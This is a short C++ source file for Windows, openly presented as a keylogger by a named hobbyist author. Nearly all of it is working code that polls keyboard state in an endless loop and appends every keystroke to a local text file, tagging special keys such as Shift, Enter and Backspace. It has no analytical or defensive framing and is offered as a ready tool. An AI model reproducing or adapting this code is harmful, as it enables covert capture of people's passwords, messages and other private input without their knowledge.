// Keylogger  
//2021 Develop with ❤ by pampa_rider (https://github.com/pampa-rider)
//twitter: pampa_rider

#define _WIN32_WINNT 0x0500
#include<Windows.h>
#include<string>
#include<stdlib.h>
#include<stdio.h>
#include<iostream>
#include<fstream>
using namespace std;

void log(string in_str)
{
fstream inFile;
inFile.open("input.txt",fstream::app);
if(inFile.is_open()){
inFile << in_str;
inFile.close();	
}
return;	
}


bool special_keys(int st_key)
{
switch(st_key)
{
case VK_SPACE:
log(" ");
return true;

case VK_SHIFT:
log("#SHIFT#");
return true;

case VK_RETURN:
log("\n");
return true;

case VK_BACK:
log("#BACK#");
return true;

case VK_RBUTTON:
log("#R_CLICK#");
return true;

case VK_CAPITAL:
log("#CAPSLCK#");
return true;

case VK_TAB:
log("#TAB#");
return true;

case VK_UP:
log("#UP#");
return true;

case VK_DOWN:
log("#DOWN#");
return true;

case VK_LEFT:
log("#LEFT#");
return true;

case VK_RIGHT:
log("#RIGHT#");
return true;

case VK_CONTROL:
log("#CONTROL#");
return true;

case VK_MENU:
log("#ALT#");
return true;

default:
return false;
}

}


int main()
{
char KEY='x';

while(true)
	{
		for(KEY=8;KEY<=190;KEY++)
		{

		if(GetAsyncKeyState(KEY) == -32767)
		{
			if(special_keys(KEY) == false)
			{

			fstream inFile;
			inFile.open("input.txt",fstream::app);
			if(inFile.is_open()){
			inFile << char(KEY);
			inFile.close();
			}

		}	

		}
	
	}
return 0;
}	
}
